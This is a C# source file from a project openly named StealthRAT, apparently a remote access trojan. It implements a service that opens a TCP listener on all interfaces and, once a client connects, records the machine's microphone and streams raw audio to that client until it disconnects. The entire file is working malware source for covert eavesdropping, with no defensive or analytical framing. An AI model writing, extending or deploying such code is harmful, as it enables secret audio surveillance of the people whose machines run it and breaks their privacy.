using System.Net;
using System.Net.Sockets;
using NAudio.Wave;
using StealthRAT.Interfaces;
using StealthRAT.Models;

namespace StealthRAT.Services;

/// <summary>
/// Manages real-time audio capture from the system microphone and streams
/// raw PCM audio data to connected clients over TCP.
/// Uses NAudio's WaveInEvent for non-blocking audio capture.
/// </summary>
public sealed class AudioCaptureService : IDisposable
{
    private readonly ILoggerService _logger;
    private TcpListener? _listener;
    private bool _disposed;

    /// <summary>
    /// Initializes a new instance of the <see cref="AudioCaptureService"/> class.
    /// </summary>
    /// <param name="logger">The logging service for recording operational events.</param>
    public AudioCaptureService(ILoggerService logger)
    {
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
    }

    /// <summary>
    /// Starts listening for audio streaming connections on the configured port.
    /// When a client connects, microphone capture begins and raw PCM data
    /// is streamed until the client disconnects or cancellation is requested.
    /// </summary>
    /// <param name="cancellationToken">Token to signal graceful shutdown.</param>
    public async Task StartAsync(CancellationToken cancellationToken)
    {
        _listener = new TcpListener(IPAddress.Any, ServerConfiguration.AudioPort);
        _listener.Start();
        _logger.LogInfo($"Audio capture service started on port {ServerConfiguration.AudioPort}");

        try
        {
            while (!cancellationToken.IsCancellationRequested)
            {
                TcpClient client = await _listener.AcceptTcpClientAsync(cancellationToken);
                _ = HandleClientAsync(client, cancellationToken);
            }
        }
        catch (OperationCanceledException)
        {
            _logger.LogInfo("Audio capture service shutting down gracefully");
        }
        catch (Exception ex)
        {
            _logger.LogError("Audio capture listener encountered an error", ex);
        }
        finally
        {
            _listener.Stop();
        }
    }

    /// <summary>
    /// Handles an individual client connection for audio streaming.
    /// Starts microphone capture and streams data until disconnection.
    /// </summary>
    /// <param name="client">The connected TCP client.</param>
    /// <param name="cancellationToken">Token to signal cancellation.</param>
    private async Task HandleClientAsync(TcpClient client, CancellationToken cancellationToken)
    {
        using (client)
        await using (NetworkStream stream = client.GetStream())
        {
            var waveFormat = new WaveFormat(
                ServerConfiguration.AudioSampleRate,
                ServerConfiguration.AudioBitDepth,
                ServerConfiguration.AudioChannels);

            using var capture = new WaveInEvent { WaveFormat = waveFormat };

            // Stream audio data as it becomes available
            capture.DataAvailable += (sender, eventArgs) =>
            {
                try
                {
                    if (client.Connected)
                    {
                        stream.Write(eventArgs.Buffer, 0, eventArgs.BytesRecorded);
                    }
                }
                catch (IOException)
                {
                    // Client disconnected; recording will be stopped below
                }
                catch (ObjectDisposedException)
                {
                    // Stream was disposed; expected during cleanup
                }
            };

            capture.RecordingStopped += (sender, eventArgs) =>
            {
                if (eventArgs.Exception != null)
                {
                    _logger.LogError("Audio recording stopped due to error", eventArgs.Exception);
                }
            };

            capture.StartRecording();
            _logger.LogInfo("Audio capture started (microphone streaming to client)");

            // Keep the connection alive until client disconnects or cancellation
            await WaitForDisconnectionAsync(client, stream, cancellationToken);

            capture.StopRecording();
            _logger.LogInfo("Audio capture stopped (client disconnected)");
        }
    }

    /// <summary>
    /// Waits for the client to disconnect by attempting to read from the stream.
    /// This is a blocking wait that respects the cancellation token.
    /// </summary>
    /// <param name="client">The TCP client to monitor.</param>
    /// <param name="stream">The network stream to read from.</param>
    /// <param name="cancellationToken">Token to signal cancellation.</param>
    private static async Task WaitForDisconnectionAsync(
        TcpClient client,
        NetworkStream stream,
        CancellationToken cancellationToken)
    {
        var buffer = new byte[1];
        while (!cancellationToken.IsCancellationRequested && client.Connected)
        {
            try
            {
                int bytesRead = await stream.ReadAsync(buffer, cancellationToken);
                if (bytesRead == 0) break; // Client closed connection gracefully
            }
            catch (OperationCanceledException)
            {
                break;
            }
            catch (IOException)
            {
                break; // Connection lost
            }
        }
    }

    /// <summary>
    /// Releases resources used by the audio capture service.
    /// </summary>
    public void Dispose()
    {
        if (!_disposed)
        {
            _listener?.Stop();
            _disposed = true;
        }
    }
}
